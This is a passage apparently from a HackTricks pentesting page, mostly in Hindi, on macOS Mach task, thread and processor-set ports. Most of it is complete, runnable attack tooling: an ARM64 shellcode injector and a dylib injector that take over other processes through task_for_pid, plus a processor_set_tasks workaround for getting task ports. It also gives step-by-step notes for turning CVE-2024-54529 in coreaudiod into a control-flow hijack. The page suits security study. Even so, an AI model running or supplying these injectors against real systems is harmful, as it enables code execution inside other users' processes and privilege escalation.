> ध्यान दें कि किसी **अलग task** के task port पर SEND right होने पर, ऐसे actions उस अलग task पर किए जा सकते हैं।

इसके अलावा, task port **`vm_map`** port भी होता है, जो caller को `vm_read()` और `vm_write()` जैसे functions के माध्यम से किसी task के भीतर **memory read और manipulate** करने की अनुमति देता है। इसका अर्थ है कि किसी अन्य task के task port पर SEND rights रखने वाला task उस task में **code inject** कर सकता है।

याद रखें कि **kernel भी एक task है**। इसलिए यदि कोई **kernel_task** पर **SEND permissions** प्राप्त करने में सफल हो जाता है, तो वह kernel से कुछ भी execute करवा सकेगा (jailbreaks)।

- Caller task के लिए इस port का **name प्राप्त करने** हेतु `mach_task_self()` call करें। यह port केवल **`exec()`** के दौरान **inherited** होता है; `fork()` से बनाया गया नया task एक नया task port प्राप्त करता है (एक special case के रूप में, suid binary में `exec()` के बाद task को भी नया task port मिलता है)। किसी task को spawn करके उसका port प्राप्त करने का एकमात्र तरीका `fork()` करते समय ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) करना है।
- Port तक access के लिए ये restrictions हैं (binary `AppleMobileFileIntegrity` के `macos_task_policy` से):
- यदि app के पास **`com.apple.security.get-task-allow` entitlement** है, तो **same user** के processes task port तक access कर सकते हैं (यह entitlement आमतौर पर debugging के लिए Xcode द्वारा जोड़ा जाता है)। **notarization** process इसे production releases के लिए allow नहीं करेगा।
- **`com.apple.system-task-ports`** entitlement वाले apps kernel को छोड़कर **किसी भी** process का **task port** प्राप्त कर सकते हैं। पुराने versions में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple applications को दिया जाता है।
- **Root**, ऐसे applications के **task ports** तक access कर सकता है जो **hardened** runtime के साथ compiled नहीं हैं (और Apple से संबंधित नहीं हैं)।

**The task name port:** _task port_ का एक unprivileged version। यह task को reference करता है, लेकिन उसे control करने की अनुमति नहीं देता। इसके माध्यम से उपलब्ध लगने वाली एकमात्र चीज़ `task_info()` है।

### Thread Ports

Threads के साथ भी संबंधित ports होते हैं, जो `task_threads` call करने वाले task और `processor_set_threads` के माध्यम से processor से visible होते हैं। Thread port पर SEND right होने से `thread_act` subsystem के functions का उपयोग किया जा सकता है, जैसे:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

कोई भी thread `mach_thread_sef` call करके यह port प्राप्त कर सकता है।

### Shellcode Injection in thread via Task port

आप यहाँ से shellcode प्राप्त कर सकते हैं:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

पिछले program को **Compile** करें और समान user के साथ code inject करने में सक्षम होने के लिए **entitlements** जोड़ें (अन्यथा आपको **sudo** का उपयोग करना होगा)।<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> iOS पर इसे काम करने के लिए entitlement `dynamic-codesigning` की आवश्यकता होती है, ताकि writable memory को executable बनाया जा सके।

### Task port के माध्यम से thread में Dylib Injection

macOS में **threads** को **Mach** के माध्यम से या posix `pthread` api का उपयोग करके manipulate किया जा सकता है। पिछले injection में हमने जो thread बनाया था, वह Mach api का उपयोग करके बनाया गया था, इसलिए **यह posix compliant नहीं है**।

एक **simple shellcode** को inject करके command execute करना संभव था, क्योंकि उसे **posix** compliant apis के साथ काम करने की आवश्यकता **नहीं थी**, केवल Mach के साथ थी। **More complex injections** के लिए **thread** का **posix compliant** होना भी आवश्यक होगा।

इसलिए, **thread को बेहतर बनाने** के लिए उसे **`pthread_create_from_mach_thread`** call करना चाहिए, जो एक **valid pthread** बनाएगा। इसके बाद यह नया pthread **dlopen** call करके system से **dylib load** कर सकता है। इसलिए अलग-अलग actions करने के लिए नया shellcode लिखने के बजाय custom libraries load करना संभव है।<sup>[[2]](#references)</sup>

आप **example dylibs** यहां पा सकते हैं (उदाहरण के लिए, वह जो एक log generate करता है और फिर आप उसे listen कर सकते हैं):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Task port के माध्यम से Thread Hijacking <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

इस तकनीक में process के एक thread को hijack किया जाता है:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

जब `task_for_pid` या `thread_create_*` को call किया जाता है, तो kernel के `struct task` में एक counter increment होता है, जिसे user mode से `task_info(task, TASK_EXTMOD_INFO, ...)` call करके access किया जा सकता है।

## Exception Ports

जब किसी thread में कोई exception होता है, तो यह exception उस thread के designated exception port पर भेजा जाता है। यदि thread इसे handle नहीं करता, तो इसे task के exception ports पर भेजा जाता है। यदि task इसे handle नहीं करता, तो इसे launchd द्वारा managed host port पर भेजा जाता है, जहाँ इसे acknowledge किया जाएगा। इसे exception triage कहा जाता है।

ध्यान दें कि अंत में, यदि report को उचित रूप से handle नहीं किया गया, तो यह आमतौर पर ReportCrash daemon द्वारा handle की जाएगी। हालांकि, उसी task का कोई अन्य thread exception को manage कर सकता है; crash reporting tools जैसे `PLCreashReporter` यही करते हैं।

## अन्य Objects

### Clock

कोई भी user clock की information access कर सकता है, लेकिन time set करने या अन्य settings को modify करने के लिए root होना आवश्यक है।

Information प्राप्त करने के लिए `clock` subsystem के functions call किए जा सकते हैं, जैसे: `clock_get_time`, `clock_get_attributtes` या `clock_alarm`\
Values modify करने के लिए `clock_priv` subsystem को `clock_set_time` और `clock_set_attributes` जैसे functions के साथ use किया जा सकता है।

### Processors और Processor Set

Processor APIs `processor_start`, `processor_exit`, `processor_info` और `processor_get_assignment` जैसे functions के माध्यम से single logical processor को control करने की अनुमति देती हैं।

इसके अलावा, **processor set** APIs multiple processors को एक group में group करने का तरीका प्रदान करती हैं। **`processor_set_default`** call करके default processor set प्राप्त किया जा सकता है।\
Processor set के साथ interact करने के लिए ये कुछ interesting APIs हैं:

- `processor_set_statistics`
- `processor_set_tasks`: Processor set के अंदर सभी tasks के send rights की array return करता है
- `processor_set_threads`: Processor set के अंदर सभी threads के send rights की array return करता है
- `processor_set_stack_usage`
- `processor_set_info`

जैसा कि [**इस post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) में बताया गया है, अतीत में इससे पहले बताई गई protection को bypass करके अन्य processes में task ports प्राप्त करना और **`processor_set_tasks`** call करके तथा प्रत्येक process पर एक host port प्राप्त करके उन्हें control करना संभव था।<sup>[[10]](#references)</sup>\
आजकल उस function का उपयोग करने के लिए root की आवश्यकता होती है और यह protected है, इसलिए आप इन ports को केवल unprotected processes पर ही प्राप्त कर पाएंगे।<sup>[[10]](#references)</sup>

आप इसे आजमा सकते हैं:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
